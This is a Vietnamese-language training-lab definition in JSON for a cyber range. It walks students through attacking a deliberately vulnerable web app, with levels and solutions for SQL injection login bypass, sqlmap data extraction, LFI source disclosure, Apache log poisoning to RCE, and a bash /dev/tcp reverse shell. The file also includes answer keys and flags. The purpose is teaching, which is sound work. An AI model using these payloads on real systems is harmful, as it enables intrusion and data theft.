@@ -1,0 +1,271 @@
+{
+  "title": "Ứng dụng Web: SQLi → LFI → RCE",
+  "description": "Bài lab kiểm thử xâm nhập ứng dụng web theo chuỗi tấn công đầy đủ trên ứng dụng nội bộ giả lập \"TaskManager\". Sinh viên sẽ tìm giao diện quản trị ẩn, vượt qua đăng nhập bằng SQL Injection, trích xuất dữ liệu bằng sqlmap, khai thác Local File Inclusion để đọc mã nguồn, sau đó kết hợp log poisoning để thực thi lệnh từ xa và tạo reverse shell.",
+  "prerequisites": [
+    "Biết sử dụng lệnh Linux cơ bản",
+    "Hiểu cơ bản về HTTP request/response",
+    "Biết cú pháp SQL cơ bản",
+    "Có khả năng đọc mã PHP ở mức cơ bản"
+  ],
+  "outcomes": [
+    "Thực hiện dò tìm thư mục/nội dung ẩn bằng gobuster và kiểm tra robots.txt",
+    "Khai thác SQL Injection thủ công để vượt qua đăng nhập",
+    "Dùng sqlmap để liệt kê và trích xuất dữ liệu từ cơ sở dữ liệu",
+    "Khai thác Local File Inclusion (LFI) để đọc mã nguồn bằng PHP wrapper",
+    "Khai thác log poisoning để đạt Remote Code Execution (RCE)",
+    "Tạo reverse shell và thu thập flag cuối cùng trên máy chủ web"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Giới thiệu",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Ứng dụng Web: SQLi → LFI → RCE\n\nBạn được giao nhiệm vụ kiểm thử bảo mật cho **TaskManager**, một ứng dụng web nội bộ dùng để quản lý công việc. Trang công khai tại `http://172.16.0.10` nhìn khá đơn giản, nhưng khách hàng nghi ngờ rằng ứng dụng còn có khu vực quản trị ẩn.\n\nMục tiêu của bạn là tìm giao diện quản trị, vượt qua cơ chế đăng nhập và tiếp tục khai thác chuỗi lỗ hổng cho đến khi có thể thực thi lệnh trên máy chủ web.\n\n## Mô hình lab\n\n| Host | Vai trò | IP |\n| --- | --- | --- |\n| attacker | Kali Linux | 172.16.0.100 |\n| webserver | TaskManager (LAMP) | 172.16.0.10 |\n| db-server | MySQL/MariaDB nội bộ | 172.16.0.20 |\n\nTrong bài này, thông tin quan trọng của cơ sở dữ liệu phải được khai thác thông qua ứng dụng web. Bạn không cần đăng nhập trực tiếp vào `db-server` để hoàn thành bài.\n\n## Lưu ý\n\nỨng dụng trong bài là ứng dụng giả lập, được cố ý xây dựng có lỗ hổng để phục vụ đào tạo. Các kỹ thuật trong bài chỉ được sử dụng trong môi trường được cấp quyền như sandbox của bài lab này."
+    },
+    {
+      "title": "Truy cập sandbox",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Nhiệm vụ đầu tiên là truy cập vào sandbox. Sau khi kết nối thành công, nộp đáp án **`start`**.\n\n### Cách truy cập sandbox\n1. Ở phần topology bên phải, nhấp chuột phải vào máy **`attacker`**, sau đó chọn **`Open GUI`**.\n2. Đăng nhập với tài khoản **`user`** và mật khẩu **`Password123`**.\n3. Từ máy `attacker`, bạn sẽ thực hiện các thao tác kiểm thử đối với `webserver` tại địa chỉ `172.16.0.10`.",
+      "local_content": "Sandbox này chưa được kiểm thử cho chế độ local sandbox."
+    },
+    {
+      "title": "Level 1: Dò tìm thư mục ẩn",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": "/admin_portal_v2",
+      "answer_variable_name": null,
+      "content": "Trang chủ công khai của TaskManager không hiển thị liên kết nào đến giao diện quản trị. Hãy bắt đầu bằng các bước reconnaissance cơ bản đối với ứng dụng web. Một số website có thể vô tình tiết lộ đường dẫn nhạy cảm trong file `robots.txt`.\n\nYêu cầu: nộp **đường dẫn của thư mục quản trị ẩn**, theo định dạng `/ten_thu_muc`, không nhập dấu `/` ở cuối.",
+      "solution": "Kiểm tra trang chủ công khai trước:\n```bash\ncurl http://172.16.0.10/\n```\n\nSau đó kiểm tra file crawler rules của website:\n```bash\ncurl http://172.16.0.10/robots.txt\n```\n\nFile `robots.txt` tiết lộ đường dẫn quản trị bị ẩn:\n```text\nDisallow: /admin_portal_v2\n```\n\nBạn cũng có thể chạy content discovery:\n```bash\ngobuster dir -u http://172.16.0.10 -w /usr/share/dirb/wordlists/common.txt -x php,txt\n```\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Nên kiểm tra ở đâu trước?",
+          "content": "Hãy kiểm tra web root và các file reconnaissance phổ biến như `/robots.txt`.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Ví dụ lệnh",
+          "content": "Thử chạy: `curl http://172.16.0.10/robots.txt`. Tìm dòng `Disallow` để xác định đường dẫn bị ẩn.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 2: Vượt qua đăng nhập bằng SQL Injection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": null,
+      "answer": "superadmin_2077",
+      "answer_variable_name": null,
+      "content": "Form đăng nhập của trang quản trị xây dựng câu truy vấn SQL bằng cách nối trực tiếp dữ liệu người dùng nhập vào:\n```sql\nSELECT * FROM users WHERE user='$u' AND pass='$p'\n```\n\nHãy vượt qua cơ chế đăng nhập mà không cần biết mật khẩu hợp lệ. Sau khi vào được dashboard, quan sát xem bạn đang đăng nhập dưới tài khoản nào.\n\nYêu cầu: nộp **username hiển thị trên dashboard** sau khi bypass thành công.",
+      "solution": "Trong form đăng nhập, nhập:\n- Username: `' OR 1=1-- -`\n- Password: nhập bất kỳ giá trị nào\n\nPayload này biến điều kiện `WHERE` thành điều kiện luôn đúng, ví dụ:\n```sql\nSELECT * FROM users WHERE user='' OR 1=1-- -' AND pass='...'\n```\n\nỨng dụng sẽ lấy dòng đầu tiên trả về từ bảng `users` và đăng nhập bạn bằng tài khoản đó.\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Câu truy vấn SQL trông như thế nào?",
+          "content": "Câu truy vấn là `SELECT * FROM users WHERE user='$u' AND pass='$p'` và không dùng prepared statement. Hãy nghĩ cách làm cho mệnh đề `WHERE` luôn đúng.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Payload nên thử",
+          "content": "Với dạng truy vấn này, có thể thử payload kinh điển: `' OR 1=1-- -` trong ô username.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 3: Trích xuất database bằng sqlmap",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "sk_live_51gHTofJustice",
+      "answer_variable_name": null,
+      "content": "Bạn đã chứng minh được form đăng nhập bị SQL Injection. Bây giờ hãy tự động hóa quá trình liệt kê và trích xuất dữ liệu trong cơ sở dữ liệu bằng **sqlmap**.\n\nYêu cầu: nộp giá trị của cột **`api_key`** trong bảng **`secrets`**.",
+      "solution": "Dùng sqlmap để kiểm tra tham số `user` của form đăng nhập:\n```bash\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch --dbs\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager --tables\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager -T secrets --dump\n```\n\nLệnh đầu tiên liệt kê database, lệnh thứ hai liệt kê các bảng trong database `taskmanager`, và lệnh cuối trích xuất bảng `secrets`.\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Tham số nào bị lỗi?",
+          "content": "Tham số POST `user` của `login.php` có thể bị SQL Injection. Khi dùng sqlmap, chỉ rõ bằng tùy chọn `-p user`.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Quy trình dùng sqlmap",
+          "content": "Trước hết dùng `--dbs` để liệt kê database, sau đó dùng `--tables` để liệt kê bảng trong database phù hợp, rồi dùng `--dump -T secrets` để trích xuất bảng cần tìm.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 4: LFI với PHP Wrapper",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "Db_S3cr3t_2024_wr4pp3r",
+      "answer_variable_name": null,
+      "content": "Tham số `?page=` trên dashboard dùng để nạp các file PHP nội bộ, ví dụ `dashboard.php?page=tasks.php`. Cơ chế kiểm tra đầu vào rất yếu: ứng dụng chỉ cố gắng xóa chuỗi `../`, nhưng không kiểm soát chặt file được include.\n\nNếu yêu cầu `config.php` trực tiếp, PHP sẽ thực thi file đó thay vì hiển thị mã nguồn, nên bạn không nhìn thấy nội dung cấu hình. Hãy dùng PHP stream wrapper để buộc máy chủ trả về **mã nguồn** dưới dạng base64.\n\nYêu cầu: nộp giá trị của hằng **`DB_PASS`** được định nghĩa trong `config.php`.",
+      "solution": "Cần có session đăng nhập từ Level 2. Sau đó gọi dashboard với PHP filter wrapper:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=php://filter/convert.base64-encode/resource=config.php\"\n```\n\nSao chép chuỗi base64 trong phản hồi rồi giải mã:\n```bash\nuser@attacker:~$ echo '<base64_blob>' | base64 -d\n```\n\nMã nguồn PHP sau khi giải mã sẽ chứa hằng `DB_PASS`.\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Tại sao không đọc trực tiếp config.php?",
+          "content": "Nếu truy cập `config.php` trực tiếp, PHP sẽ thực thi file này. Vì file không in gì ra màn hình nên bạn sẽ thấy trang trống, không phải mã nguồn.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "PHP wrapper nào dùng để đọc mã nguồn?",
+          "content": "Dùng `php://filter` với bộ lọc `convert.base64-encode`, trỏ tới `resource=config.php`. Máy chủ sẽ trả về nội dung file được mã hóa base64.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Có cần đăng nhập không?",
+          "content": "Có. `dashboard.php` kiểm tra session hợp lệ, vì vậy bạn cần dùng lại cookie phiên đăng nhập từ Level 2, hoặc dùng `curl -c`/`curl -b` để lưu và gửi cookie.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 5: Log Poisoning để đạt RCE",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 30,
+      "minimal_possible_solve_time": null,
+      "answer": "taskmgr-prod-01",
+      "answer_variable_name": null,
+      "content": "Lỗ hổng LFI ở dashboard có thể include bất kỳ file nào mà tiến trình web server đọc được, bao gồm cả Apache access log. Mỗi request gửi đến web server sẽ được ghi vào log, trong đó có header `User-Agent`. Nếu bạn đặt mã PHP vào `User-Agent`, rồi include file log, PHP sẽ phân tích và thực thi đoạn mã đó.\n\nYêu cầu: nộp nội dung của file **`/etc/hostname`** trên máy `webserver`.",
+      "solution": "Bước 1 — ghi payload PHP vào access log thông qua header User-Agent:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" -A \"<?php system(\\$_GET['cmd']); ?>\" http://172.16.0.10/\n```\n\nBước 2 — include file log đã bị poisoning và truyền lệnh qua tham số `cmd`:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=cat+/etc/hostname\"\n```\n\nKhi file log được `include()`, đoạn `<?php ... ?>` trong log được PHP xử lý như mã thật, và hàm `system()` sẽ chạy lệnh bạn truyền vào.\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "User-Agent được ghi ở đâu?",
+          "content": "Apache ghi header `User-Agent` của mỗi request vào `access.log`. Nếu chuỗi này chứa thẻ PHP hợp lệ và file log bị include, PHP có thể thực thi đoạn mã đó.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Payload User-Agent nên dùng",
+          "content": "Có thể dùng payload như `<?php system($_GET['cmd']); ?>`. Với curl, truyền payload bằng tùy chọn `-A \"<payload>\"`.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Kích hoạt payload như thế nào?",
+          "content": "Dùng lại tham số LFI: `?page=/var/log/apache2/access.log`, sau đó thêm `&cmd=<lệnh>` để chạy lệnh qua payload đã ghi vào log.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 6: Reverse Shell và thu thập flag cuối",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "FLAG{full_ch41n_SQL1_LFI_l0g_RCE}",
+      "answer_variable_name": null,
+      "content": "Chạy một lệnh đơn lẻ đã chứng minh được RCE, nhưng trong thực tế một shell tương tác sẽ hữu ích hơn nhiều. Hãy dùng RCE từ Level 5 để tạo reverse shell từ `webserver` về máy `attacker`, sau đó đọc file bí mật cuối cùng.\n\nYêu cầu: nộp nội dung của file **`/var/www/html/admin_portal_v2/.secret_vault/crown.txt`**.",
+      "solution": "Bước 1 — mở listener trên máy Kali:\n```bash\nuser@attacker:~$ nc -lvnp 4444\n```\n\nBước 2 — kích hoạt reverse shell qua RCE log poisoning, dùng IP của attacker là `172.16.0.100`:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.16.0.100/4444+0>%261'\"\n```\n\nBước 3 — sau khi bắt được shell, đọc file flag:\n```bash\nwww-data@webserver:~$ cat /var/www/html/admin_portal_v2/.secret_vault/crown.txt\n```\n\nFlag là: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Cần chuẩn bị gì trước?",
+          "content": "Trước khi kích hoạt reverse shell, hãy mở netcat listener trên máy attacker: `nc -lvnp 4444`.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Làm sao để có shell thay vì chỉ có output của một lệnh?",
+          "content": "Truyền one-liner bash reverse shell vào tham số `cmd` thông qua RCE từ Level 5. Địa chỉ IP đích là IP của máy attacker và cổng là cổng bạn đang lắng nghe.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Flag cuối nằm ở đâu?",
+          "content": "Sau khi có shell với quyền `www-data`, kiểm tra thư mục ẩn `.secret_vault` bên dưới web root của admin panel.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Tổng kết",
+      "level_type": "INFO_LEVEL",
+      "order": 8,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "Bạn đã hoàn thành toàn bộ chuỗi tấn công:\n\n**dò tìm nội dung ẩn → SQL Injection → trích xuất database tự động → LFI đọc mã nguồn → log poisoning → RCE → reverse shell**.\n\nMỗi bước khai thác một lỗi nhỏ nhưng thực tế: đường dẫn quản trị không được công khai nhưng bị tiết lộ, truy vấn SQL nối chuỗi trực tiếp, tham số LFI không dùng allowlist, và file log Apache vừa ghi được bởi dữ liệu attacker kiểm soát vừa đọc được bởi tiến trình web server. Các lỗi này không quá đặc biệt, nhưng khi kết hợp lại có thể tạo thành một chuỗi tấn công nghiêm trọng.\n\n**Kịch bản**: nội dung lab giả lập được xây dựng cho môi trường đào tạo CyberRangeCZ."
+    }
+  ],
+  "estimated_duration": 140,
+  "variant_sandboxes": false
+}
